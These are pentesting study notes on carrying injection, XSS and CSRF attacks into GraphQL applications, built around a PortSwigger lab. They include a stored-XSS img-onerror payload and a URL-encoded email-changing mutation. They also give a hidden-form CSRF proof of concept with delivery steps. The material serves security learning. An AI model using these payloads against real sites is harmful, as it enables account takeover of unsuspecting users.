
# GraphQL Application Attacks & Exploitation Notes

## High-Level Summary

This document covers how **traditional web application attacks** like **Injection**, **Cross-Site Scripting (XSS)**, and **Cross-Site Request Forgery (CSRF)** apply in the **GraphQL** context. It emphasizes not only recognizing these vulnerabilities but adapting your **methodology** and tools to find them within GraphQL-based applications. The techniques demonstrated use **Burp Suite**, introspection, and **manual query crafting** to probe for weaknesses, highlighting GraphQL’s role as a **delivery vector**, not a new class of vulnerabilities.

---

## 📌 Injection Attacks in GraphQL

### Context:
Injection vulnerabilities in GraphQL are tested the same way as in REST—wherever **user input interacts with the backend**, particularly databases.

> [!info]
> **Injection tests target variables within queries or mutations.**
> These include user-controlled fields like `serverID`, `name`, etc., which may interact with databases.

### Methodology:

- Use Burp Suite to intercept and observe GraphQL traffic.
- Review the **GraphQL tab** to find detected queries and mutations.
- If introspection is **disabled**, perform manual interaction across the app to populate queries.
- Focus on **variables** and **reflected input** in responses to guide injection points.

```graphql
mutation {
  createRoom(input: {
    name: "Room 2"
  }) {
    id
  }
}
````

Test cases:

- SQLi in variables like `serverID`, `name`
    
- Input reflected in response ⇒ test for **XSS**, **SSTI**, **CSTI**
    

---

## 🛡️ Cross-Site Scripting (XSS) in GraphQL

> [!info]  
> **GraphQL does not prevent XSS by design.**  
> Wherever input is reflected, XSS should be tested.

### Example:

A stored XSS vulnerability was discovered via a sign-up field using:

```html
<img src=x onerror=prompt(1)>
```

Steps:

1. Register with the payload in email or name field.
    
2. Interact with the app to reflect the payload.
    
3. Observe if it executes when revisited or shown to others.
    

> [!warning]  
> Payloads might be **encoded client-side**, but can be **replaced manually** in intercepted requests to bypass frontend sanitization.

### Other Common XSS Surfaces in GraphQL:

- Third-party OAuth account fields
    
- Reflected mutation responses
    
- Application pages rendering unsanitized user input
    

---

## 🔒 Cross-Site Request Forgery (CSRF) in GraphQL

### Context:

- **CSRF is harder** to achieve in GraphQL compared to traditional apps.
    
- Modern stacks like **Apollo Server** have **CSRF protection enabled by default**.
    
- Apps using **JSON Web Tokens (JWT)** via **headers** (not cookies) are generally **immune to CSRF**.
    

> [!info]  
> CSRF attacks typically target endpoints accepting `application/x-www-form-urlencoded` requests via cookie-based authentication.

---

## 💡 CSRF Exploitation via GraphQL (Lab Demo)

### Lab: _PortSwigger - Performing CSRF exploits over GraphQL_

1. **Identify mutation with side effects**, e.g., changing user email:
    

```graphql
mutation changeEmail($input: ChangeEmailInput!) {
  changeEmail(input: { email: "new@example.com" })
}
```

2. **Verify no CSRF tokens** are present.
    
3. Rebuild the mutation in a **form-encoded format**:
    

```plaintext
query=mutation%20changeEmail%7BchangeEmail(input%3A%7Bemail%3A%22attacker%40evil.com%22%7D)%7D
```

4. Use **Burp Suite Repeater** or **Engagement Tools** to test.
    

> [!tip]  
> Use **ChatGPT or manual formatting** to convert JSON queries into `application/x-www-form-urlencoded` if needed. Always verify the format manually.

---

## 🧪 CSRF PoC Construction (Burp Pro vs Manual)

> [!note]  
> Burp Suite Pro has built-in **CSRF PoC generator**, but a manual version works just as well.

### Manual HTML PoC:

```html
<form action="https://target.site/graphql" method="POST" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="query" value='mutation changeEmail{changeEmail(input:{email:"attacker@evil.com"})}' />
  <input type="submit" value="Submit request" />
</form>
```

1. Paste the form in an **exploit server**.
    
2. Deliver to the victim.
    
3. Confirm via email field change on target.
    

> [!warning]  
> Ensure no double-encoding occurs (e.g., `%20` becoming `%2520`). Use Burp or text editors to **clean payloads**.

---

## 🧰 Tools Section

### 🔧 Burp Suite

- **Purpose**: Intercept and analyze GraphQL requests.
    
- **Use Cases**:
    
    - View GraphQL query/mutation structure.
        
    - Repeater for testing payloads.
        
    - Engagement tools (Pro) to generate CSRF PoC.
        

```bash
# No CLI, use UI:
- Proxy → HTTP history
- GraphQL tab for query detection
- Engagement Tools → Generate CSRF PoC
```

---

### 🔧 ChatGPT (as helper)

- **Purpose**: Convert JSON GraphQL queries into `x-www-form-urlencoded` format.
    
- **How to Use**:
    
    - Input: Raw GraphQL mutation or query
        
    - Prompt: “Convert this GraphQL query to x-www-form-urlencoded format”
        
- **Caution**: Always double-check the format before use.
    

---

### 🔧 Visual Studio Code

- **Purpose**: Manual formatting and editing of GraphQL queries.
    
- **Use Cases**:
    
    - Remove line breaks and quotes for clean payloads.
        
    - Encode values selectively.
        

---

## Methodology Reminder

> [!info]  
> **GraphQL is just a layer. Your methodology must adapt, not abandon, traditional testing techniques.**

- Keep testing for:
    
    - SQL Injection
        
    - XSS
        
    - CSRF
        
    - SSRF
        
    - Broken Access Control
        
- GraphQL introduces **query batching**, **introspection**, and **variable injection** but is still subject to traditional logic flaws and security issues.
    

---

## Final Notes

- Never rely solely on GraphQL-specific testing. Full-stack security means testing the **application as a whole**.
    
- Know the framework (e.g., Apollo) and its **default security configurations**.
    
- Explore both:
    
    - GraphQL-specific features (e.g., introspection)
        
    - General API vulnerabilities delivered via GraphQL
        

> [!tip]  
> For each query or mutation, ask:  
> “Where does user input enter the system, and what happens to it next?”



---

Why URL Encode?

**Because when using `application/x-www-form-urlencoded`, special characters like `{`, `"`, `:` must be URL-encoded** so they don't break the format of the HTTP request body.

Example:

http

CopyEdit

`query=mutation{changeEmail(email:"x")}`

becomes:

http

CopyEdit

`query=mutation%7BchangeEmail%28email%3A%22x%22%29%7D`

✅ This ensures the server parses it correctly as a single `query` parameter.

**TL;DR:** URL encoding makes sure the GraphQL string isn't misinterpreted in the HTTP request.